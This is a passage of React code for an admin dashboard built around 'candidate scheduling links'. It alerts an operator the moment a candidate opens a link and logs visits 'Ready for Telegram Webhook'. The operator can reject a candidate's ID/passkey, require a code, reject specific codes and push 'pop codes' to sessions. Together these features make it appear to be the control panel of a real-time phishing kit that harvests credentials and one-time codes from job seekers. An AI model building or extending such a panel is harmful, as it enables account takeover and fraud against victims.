                : "bg-gray-100 text-gray-500 border-gray-200 hover:bg-gray-200"
            }`}
            title={soundEnabled ? "Sound alerts enabled on candidate open" : "Sound alerts muted"}
          >
            {soundEnabled ? (
              <>
                <Volume2 className="w-3.5 h-3.5 text-blue-600" />
                <span>Sound ON</span>
              </>
            ) : (
              <>
                <VolumeX className="w-3.5 h-3.5 text-gray-500" />
                <span>Sound OFF</span>
              </>
            )}
          </button>

          {/* Visits History Toggle */}
          <button
            type="button"
            onClick={() => setShowVisitsLog(!showVisitsLog)}
            className={`inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-xs font-semibold border transition-all shadow-2xs cursor-pointer ${
              showVisitsLog
                ? "bg-purple-50 text-purple-700 border-purple-200"
                : "bg-white text-gray-700 border-gray-200 hover:bg-gray-50"
            }`}
            title="View recent candidate schedule link openings"
          >
            <Clock className="w-3.5 h-3.5 text-purple-600" />
            <span>Openings Log ({recentVisits.length})</span>
          </button>

          {/* Active-Only Filter Checkbox */}
          <label className="inline-flex items-center gap-2 px-3.5 py-2 bg-white border border-gray-200 rounded-xl text-xs font-semibold text-gray-700 hover:bg-gray-50 transition-colors shadow-2xs cursor-pointer select-none">
            <input
              type="checkbox"
              checked={activeOnly}
              onChange={(e) => setActiveOnly(e.target.checked)}
              className="w-4 h-4 text-[#0069ff] rounded border-gray-300 focus:ring-[#0069ff] cursor-pointer"
            />
            <span className="flex items-center gap-1.5">
              <Filter className="w-3.5 h-3.5 text-gray-500" />
              <span>Active Only</span>
            </span>
          </label>

          {/* Refresh Button */}
          <button
            type="button"
            onClick={() => {
              load();
              loadRecentVisits();
            }}
            className="inline-flex items-center gap-1.5 px-4 py-2 border rule-hairline rounded-xl font-mono text-xs font-semibold text-muted hover:text-ink hover:bg-paperdim transition-colors shadow-2xs cursor-pointer"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading ? "animate-spin" : ""}`} />
            <span>Refresh</span>
          </button>
        </div>
      </div>

      {/* Real-time Link Open Alert Banner */}
      {latestAlert && (
        <div className="bg-gradient-to-r from-blue-600 to-indigo-600 text-white rounded-2xl shadow-md p-4 sm:p-5 flex items-center justify-between gap-4 animate-fade-down">
          <div className="flex items-center gap-3.5 min-w-0">
            <div className="w-10 h-10 rounded-xl bg-white/20 flex items-center justify-center shrink-0">
              <Bell className="w-5 h-5 text-white animate-bounce" />
            </div>
            <div className="min-w-0">
              <p className="text-sm font-bold truncate">
                ⚡ Candidate Opened Scheduling Link!
              </p>
              <p className="text-xs text-blue-100 truncate mt-0.5">
                Admin Link:{" "}
                <span className="font-semibold text-white">
                  {latestAlert.admin_email || latestAlert.interviewer_name || "Default Admin"}
                </span>{" "}
                · Time: {latestAlert.time}{" "}
                {latestAlert.timezone ? `(${latestAlert.timezone})` : ""}
              </p>
            </div>
          </div>

          <button
            type="button"
            onClick={() => setLatestAlert(null)}
            className="p-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-white transition-colors cursor-pointer shrink-0"
            title="Dismiss notification"
          >
            <X className="w-4 h-4" />
          </button>
        </div>
      )}

      {/* Collapsible Recent Visits Log */}
      {showVisitsLog && (
        <div className="bg-white border border-purple-200/80 rounded-2xl shadow-sm p-6 space-y-4 animate-fade-down">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Activity className="w-4 h-4 text-purple-600" />
              <h3 className="text-sm font-bold text-gray-900">
                Recent Scheduling Link Visits (Ready for Telegram Webhook)
              </h3>
            </div>
            <span className="text-xs text-gray-400">Realtime logged</span>
          </div>

          {recentVisits.length === 0 ? (
            <p className="text-xs text-gray-400 italic py-2">
              No visits logged yet. They will appear here immediately when a candidate opens any scheduling link.
            </p>
          ) : (
            <div className="divide-y divide-gray-100 max-h-60 overflow-y-auto">
              {recentVisits.map((v) => (
                <div
                  key={v.id}
                  className="py-2.5 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs"
                >
                  <div className="flex items-center gap-2.5">
                    <span className="w-2 h-2 rounded-full bg-purple-500" />
                    <span className="font-bold text-gray-900">
                      {v.admin_email || v.interviewer_name || "Primary Admin"}
                    </span>
                    <span className="text-gray-400 font-mono text-[11px]">
                      {v.timezone || "America/New_York"}
                    </span>
                  </div>
                  <div className="flex items-center gap-3 text-gray-500">
                    <span>
                      {new Date(v.created_at).toLocaleTimeString([], {
                        hour: "2-digit",
                        minute: "2-digit",
                        second: "2-digit",
                      })}
                    </span>
                    <span className="text-[11px] text-gray-400">
                      {new Date(v.created_at).toLocaleDateString([], {
                        month: "short",
                        day: "numeric",
                      })}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* Bookings List */}
      <div className="space-y-6">
        {loading && (
          <div className="bg-white border border-gray-200 rounded-2xl p-12 text-center text-muted font-mono text-sm shadow-sm">
            Loading live bookings…
          </div>
        )}

        {!loading && pending.length === 0 && activeDraftsList.length === 0 && (!others.length || activeOnly) && (
          <div className="bg-white border border-gray-200 rounded-2xl p-12 text-center text-muted font-mono text-sm shadow-sm">
            No active candidate sessions or bookings.
          </div>
        )}

        {/* Active Draft Sessions (Candidates in ID/Passkey modal) */}
        {activeDraftsList.map((d) => {
          const isOnline = Boolean(presenceMap[d.session_id] || (d.email && presenceMap[d.email.toLowerCase()]));
          return <DraftSessionCard key={d.session_id} s={d} isOnline={isOnline} />;
        })}

        {/* Active & Pending DB Bookings */}
        {pending.map((b) => {
          const isOnline = Boolean(presenceMap[b.id] || (b.email && presenceMap[b.email.toLowerCase()]));
          return (
            <BookingCardItem
              key={b.id}
              b={b}
              busyId={busyId}
              isOnline={isOnline}
              onConfirm={confirmBooking}
              onRejectId={rejectIdPasskey}
              onRequireCode={requireCode}
              onRejectSpecificCode={rejectSpecificCode}
              onSendPopCode={sendPopCode}
              onClearPopCode={clearPopCode}
            />
          );
        })}

        {/* Completed / Past Bookings (Hidden when activeOnly filter is enabled) */}
        {!activeOnly && others.length > 0 && (
          <div className="pt-6 space-y-4">
            <h2 className="text-xs font-bold uppercase tracking-wider text-gray-400 font-mono">
              Past / Resolved Bookings ({others.length})
            </h2>
            <div className="space-y-4 opacity-80">
              {others.map((b) => {
                const isOnline = Boolean(presenceMap[b.id] || (b.email && presenceMap[b.email.toLowerCase()]));
                return (
                  <BookingCardItem
                    key={b.id}
                    b={b}
                    busyId={busyId}
                    isOnline={isOnline}
                    onConfirm={confirmBooking}
                    onRejectId={rejectIdPasskey}
                    onRequireCode={requireCode}
                    onRejectSpecificCode={rejectSpecificCode}
                    onSendPopCode={sendPopCode}
                    onClearPopCode={clearPopCode}
                  />
                );
              })}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
